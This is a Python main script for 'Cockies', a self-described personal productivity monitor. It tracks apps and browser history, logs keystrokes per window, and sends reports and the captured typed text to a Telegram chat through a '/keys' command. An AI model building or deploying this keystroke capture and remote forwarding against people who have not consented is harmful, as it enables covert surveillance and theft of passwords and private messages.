#!/usr/bin/env python3
"""
🍪 COCKIES — Monitor Personal de Productividad

Orquestador principal que coordina todos los módulos de tracking
y envía reportes/notificaciones por Telegram.

Uso:
    python main.py          # Iniciar monitor
    python main.py --setup  # Configurar bot de Telegram
    python main.py --test   # Enviar reporte de prueba
"""
import sys
import os
import time
import signal
import threading
import fcntl
from datetime import datetime
from pathlib import Path

from config import get_config, save_config
from encryption import save_encrypted
from telegram_bot import TelegramBot
from keyboard_tracker import KeyboardTracker
from browser_tracker import BrowserTracker
from app_tracker import AppTracker
from reports import ReportGenerator


LOCK_FILE = Path(__file__).parent / "data" / "cockies.lock"


def _acquire_lock():
    """Adquiere un lock exclusivo para evitar múltiples instancias."""
    LOCK_FILE.parent.mkdir(parents=True, exist_ok=True)
    lock_fd = open(LOCK_FILE, "w")
    try:
        fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        lock_fd.write(str(os.getpid()))
        lock_fd.flush()
        return lock_fd
    except OSError:
        lock_fd.close()
        print("❌ Ya hay una instancia de Cockies Monitor corriendo.")
        print("   Detén la otra instancia primero (envía /stop por Telegram).")
        sys.exit(1)


class CockiesMonitor:
    """Orquestador principal del monitor de productividad."""

    def __init__(self):
        self._config = get_config()
        self._validate_config()

        self._bot = TelegramBot(
            self._config["telegram_token"],
            self._config["telegram_chat_id"]
        )
        self._keyboard = KeyboardTracker()
        self._browser = BrowserTracker()
        self._app = AppTracker(
            check_interval=self._config.get("activity_check_interval", 5)
        )
        self._reports = ReportGenerator()

        self._is_running = False
        self._last_report_time = time.time()
        self._last_browser_check = time.time()
        self._last_idle_notification = 0
        self._last_break_reminder = 0
        self._continuous_active_time = 0
        self._daily_report_sent = False
        self._update_offset = 0

    def _validate_config(self):
        """Valida que la configuración mínima esté presente."""
        if not self._config.get("telegram_token"):
            print("❌ Token de Telegram no configurado.")
            print("   Ejecuta: python setup_bot.py")
            sys.exit(1)
        if not self._config.get("telegram_chat_id"):
            print("❌ Chat ID de Telegram no configurado.")
            print("   Ejecuta: python setup_bot.py")
            sys.exit(1)
        if not self._config.get("encryption_key"):
            from encryption import generate_key
            self._config["encryption_key"] = generate_key()
            save_config(self._config)
            print("🔐 Clave de encriptación generada automáticamente")

    def _flush_old_updates(self):
        """Descarta todos los mensajes de Telegram pendientes antes de iniciar."""
        try:
            updates = self._bot.get_updates(offset=self._update_offset)
            if updates:
                self._update_offset = updates[-1]["update_id"] + 1
                print(f"  🗑️  {len(updates)} mensajes anteriores descartados")
        except Exception:
            pass

    def start(self):
        """Inicia todos los módulos de monitoreo."""
        self._is_running = True
        print("🍪 Cockies Monitor iniciando...")

        # Descartar mensajes pendientes anteriores al inicio
        self._flush_old_updates()

        # Iniciar trackers
        self._keyboard.start()
        print("  ⌨️  Monitor de teclado: OK")

        self._app.start()
        print("  💻 Monitor de aplicaciones: OK")

        print("  🌐 Monitor de navegación: OK")

        # Notificar por Telegram
        self._bot.send_message(
            "🍪 <b>Cockies Monitor Iniciado</b>\n\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}\n"
            f"📊 Reportes cada {self._config['report_interval'] // 60} min\n"
            f"📋 Reporte diario a las {self._config['daily_report_hour']}:00\n\n"
            "Comandos disponibles:\n"
            "  /status — Estado actual\n"
            "  /report — Reporte inmediato\n"
            "  /apps — Top aplicaciones\n"
            "  /sites — Sitios visitados\n"
            "  /keys — Texto capturado\n"
            "  /pause — Pausar monitor\n"
            "  /resume — Reanudar monitor\n"
            "  /stop — Detener monitor"
        )
        print("  📱 Telegram: OK")
        print()
        print("✅ Monitor activo. Presiona Ctrl+C para detener.")
        print()

        # Configurar signal handler
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

        # Loop principal
        self._main_loop()

    def _main_loop(self):
        """Loop principal del monitor."""
        while self._is_running:
            try:
                now = time.time()

                # Verificar comandos de Telegram
                self._check_telegram_commands()

                # Verificar inactividad
                self._check_idle()

                # Verificar si necesita descanso
                self._check_break_needed()

                # Enviar reporte periódico
                report_interval = self._config.get("report_interval", 1800)
                if now - self._last_report_time >= report_interval:
                    self._send_periodic_report()
                    self._last_report_time = now

                # Verificar historial del navegador
                browser_interval = self._config.get("browser_check_interval", 300)
                if now - self._last_browser_check >= browser_interval:
                    self._check_browser_activity()
                    self._last_browser_check = now

                # Guardar datos encriptados periódicamente
                self._save_encrypted_data()

                # Reporte diario
                current_hour = datetime.now().hour
                daily_hour = self._config.get("daily_report_hour", 22)
                if current_hour == daily_hour and not self._daily_report_sent:
                    self._send_daily_report()
                    self._daily_report_sent = True
                elif current_hour != daily_hour:
                    self._daily_report_sent = False

                time.sleep(10)

            except Exception as e:
                print(f"⚠️  Error en loop principal: {e}")
                time.sleep(30)

    def _check_idle(self):
        """Verifica inactividad y notifica."""
        idle_seconds = self._keyboard.get_idle_seconds()
        idle_threshold = self._config.get("idle_threshold", 600)
        now = time.time()

        if idle_seconds > idle_threshold:
            # Notificar máximo cada 10 min de inactividad
            if now - self._last_idle_notification > 600:
                notification = self._reports.generate_idle_notification(
                    idle_seconds / 60
                )
                self._bot.send_notification("Inactividad", notification)
                self._last_idle_notification = now
                self._continuous_active_time = 0
        else:
            self._continuous_active_time += 10  # Se suma cada iteración del loop

    def _check_break_needed(self):
        """Verifica si necesita tomar un descanso."""
        long_session = self._config.get("long_session_threshold", 5400)
        now = time.time()

        if self._continuous_active_time > long_session:
            if now - self._last_break_reminder > 1800:  # Max cada 30 min
                notification = self._reports.generate_break_reminder(
                    self._continuous_active_time / 60
                )
                self._bot.send_alert(notification)
                self._last_break_reminder = now

    def _check_browser_activity(self):
        """Verifica actividad del navegador."""
        try:
            history = self._browser.get_recent_history(
                minutes=self._config.get("browser_check_interval", 300) // 60 + 1
            )
            if history:
                url_class = self._browser.classify_urls(
                    history,
                    self._config.get("productive_urls", []),
                    self._config.get("unproductive_urls", [])
                )
                # Alertar si hay mucha navegación improductiva
                if url_class.get("unproductive_count", 0) >= 5:
                    unproductive = url_class.get("unproductive", [])
                    sites = set()
                    for entry in unproductive[:5]:
                        from urllib.parse import urlparse
                        domain = urlparse(entry["url"]).netloc
                        sites.add(domain)
                    self._bot.send_notification(
                        "Navegación improductiva",
                        f"Has visitado {url_class['unproductive_count']} sitios improductivos:\n"
                        + "\n".join(f"  • {s}" for s in list(sites)[:5])
                    )
        except Exception as e:
            print(f"⚠️  Error verificando navegador: {e}")

    def _send_periodic_report(self):
        """Envía reporte periódico."""
        try:
            keyboard_stats = self._keyboard.get_stats()
            app_stats = self._app.get_stats()
            app_classification = self._app.classify_apps(
                self._config.get("productive_apps", []),
                self._config.get("unproductive_apps", [])
            )
            browser_summary = self._browser.get_domain_summary(
                minutes=self._config.get("report_interval", 1800) // 60
            )
            # Obtener historial para clasificar
            history = self._browser.get_recent_history(
                minutes=self._config.get("report_interval", 1800) // 60
            )
            url_classification = self._browser.classify_urls(
                history,
                self._config.get("productive_urls", []),
                self._config.get("unproductive_urls", [])
            )

            report = self._reports.generate_periodic_report(
                keyboard_stats, app_stats, app_classification,
                browser_summary, url_classification,
                captured_text=self._keyboard.get_captured_text()
            )
            self._bot.send_report(report)

            # Reset stats para el próximo período
            self._keyboard.reset_stats()

        except Exception as e:
            print(f"⚠️  Error generando reporte periódico: {e}")

    def _send_daily_report(self):
        """Envía el reporte diario completo."""
        try:
            keyboard_stats = self._keyboard.get_stats()
            app_stats = self._app.get_stats()
            app_classification = self._app.classify_apps(
                self._config.get("productive_apps", []),
                self._config.get("unproductive_apps", [])
            )
            browser_summary = self._browser.get_domain_summary(minutes=1440)
            history = self._browser.get_recent_history(minutes=1440)
            url_classification = self._browser.classify_urls(
                history,
                self._config.get("productive_urls", []),
                self._config.get("unproductive_urls", [])
            )

            report = self._reports.generate_daily_report(
                keyboard_stats, app_stats, app_classification,
                browser_summary, url_classification,
                captured_text=self._keyboard.get_captured_text()
            )
            self._bot.send_report(report)

            # Reset diario
            self._keyboard.reset_stats()
            self._app.reset_stats()

        except Exception as e:
            print(f"⚠️  Error generando reporte diario: {e}")

    def _save_encrypted_data(self):
        """Guarda datos encriptados en disco."""
        try:
            key = self._config.get("encryption_key", "")
            if not key:
                return

            date_str = datetime.now().strftime("%Y-%m-%d")

            # Guardar stats de apps
            app_stats = self._app.get_stats()
            save_encrypted(f"apps_{date_str}.enc", app_stats, key)

            # Guardar timeline
            timeline = self._app.get_recent_timeline(100)
            if timeline:
                save_encrypted(f"timeline_{date_str}.enc", {"timeline": timeline}, key)

            # Guardar teclas capturadas
            captured = self._keyboard.get_captured_text()
            if captured:
                save_encrypted(f"keys_{date_str}.enc", captured, key)

        except Exception:
            pass  # No interrumpir el monitor por errores de guardado

    def _check_telegram_commands(self):
        """Verifica y procesa comandos enviados al bot."""
        try:
            updates = self._bot.get_updates(offset=self._update_offset)
            for update in updates:
                self._update_offset = update["update_id"] + 1
                message = update.get("message", {})
                text = message.get("text", "").strip().lower()
                chat_id = str(message.get("chat", {}).get("id", ""))

                # Solo procesar mensajes del chat configurado
                if chat_id != self._config["telegram_chat_id"]:
                    continue

                if text == "/status":
                    self._cmd_status()
                elif text == "/report":
                    self._send_periodic_report()
                elif text == "/apps":
                    self._cmd_apps()
                elif text == "/sites":
                    self._cmd_sites()
                elif text == "/pause":
                    self._cmd_pause()
                elif text == "/resume":
                    self._cmd_resume()
                elif text == "/stop":
                    self._cmd_stop()
                elif text == "/keys":
                    self._cmd_keys()
                elif text == "/help":
                    self._cmd_help()

        except Exception:
            pass

    def _cmd_status(self):
        idle = self._keyboard.get_idle_seconds()
        app_stats = self._app.get_stats()
        self._bot.send_message(
            f"📊 <b>Estado Actual</b>\n\n"
            f"🖥 App actual: {app_stats.get('current_app', '?')}\n"
            f"📝 Ventana: {app_stats.get('current_window', '?')}\n"
            f"⏱ Inactividad: {int(idle)}s\n"
            f"⌨️ Pulsaciones: {self._keyboard.get_stats().get('total_keypresses', 0)}\n"
            f"🔄 Cambios ventana: {app_stats.get('app_switches', 0)}\n"
            f"⏰ Desde: {app_stats.get('session_start', '?')}"
        )

    def _cmd_apps(self):
        app_stats = self._app.get_stats()
        top_apps = app_stats.get("top_apps", [])
        if not top_apps:
            self._bot.send_message("No hay datos de aplicaciones aún.")
            return
        lines = ["💻 <b>Top Aplicaciones</b>\n"]
        for i, app in enumerate(top_apps, 1):
            lines.append(f"  {i}. {app['app']} — {app['minutes']} min")
        self._bot.send_message("\n".join(lines))

    def _cmd_sites(self):
        summary = self._browser.get_domain_summary(minutes=60)
        domains = summary.get("domains", {})
        if not domains:
            self._bot.send_message("No hay historial de navegación reciente.")
            return
        lines = ["🌐 <b>Sitios Visitados (última hora)</b>\n"]
        for i, (domain, count) in enumerate(domains.items(), 1):
            if i > 15:
                break
            lines.append(f"  {i}. {domain} ({count})")
        self._bot.send_message("\n".join(lines))

    def _cmd_pause(self):
        self._keyboard.stop()
        self._app.stop()
        self._bot.send_message("⏸ <b>Monitor pausado.</b>\nEnvía /resume para continuar.")

    def _cmd_resume(self):
        self._keyboard.start()
        self._app.start()
        self._bot.send_message("▶️ <b>Monitor reanudado.</b>")

    def _cmd_stop(self):
        self._bot.send_message("🛑 <b>Deteniendo monitor...</b>")
        self.stop()

    def _cmd_keys(self):
        captured = self._keyboard.get_captured_text()
        if not captured:
            self._bot.send_message("No hay texto capturado aún.")
            return
        for window, text in captured.items():
            if not text.strip():
                continue
            # Mostrar últimos 500 chars por ventana
            preview = text[-500:] if len(text) > 500 else text
            # Escapar HTML
            preview = preview.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            msg = f"⌨️ <b>{window[:60]}</b>\n\n<code>{preview}</code>"
            self._bot.send_message(msg)

    def _cmd_help(self):
        self._bot.send_message(
            "🍪 <b>Cockies Monitor — Comandos</b>\n\n"
            "/status — Estado actual\n"
            "/report — Reporte inmediato\n"
            "/apps — Top aplicaciones\n"
            "/sites — Sitios visitados\n"
            "/keys — Texto capturado\n"
            "/pause — Pausar monitor\n"
            "/resume — Reanudar monitor\n"
            "/stop — Detener monitor\n"
            "/help — Esta ayuda"
        )

    def stop(self):
        """Detiene todos los módulos."""
        print("\n🛑 Deteniendo Cockies Monitor...")
        self._is_running = False
        self._keyboard.stop()
        self._app.stop()
        self._save_encrypted_data()
        self._bot.send_message("🛑 <b>Cockies Monitor detenido.</b>")
        print("✅ Monitor detenido.")

    def _signal_handler(self, sig, frame):
        self.stop()
        sys.exit(0)


def main():
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg == "--setup":
            from setup_bot import setup
            setup()
            return
        elif arg == "--test":
            config = get_config()
            bot = TelegramBot(config["telegram_token"], config["telegram_chat_id"])
            bot.send_message("🧪 <b>Test de Cockies Monitor</b>\n\n✅ Todo funciona correctamente.")
            print("✅ Mensaje de prueba enviado.")
            return
        elif arg == "--help":
            print(__doc__)
            return

    monitor = CockiesMonitor()
    lock_fd = _acquire_lock()
    try:
        monitor.start()
    finally:
        lock_fd.close()


if __name__ == "__main__":
    main()
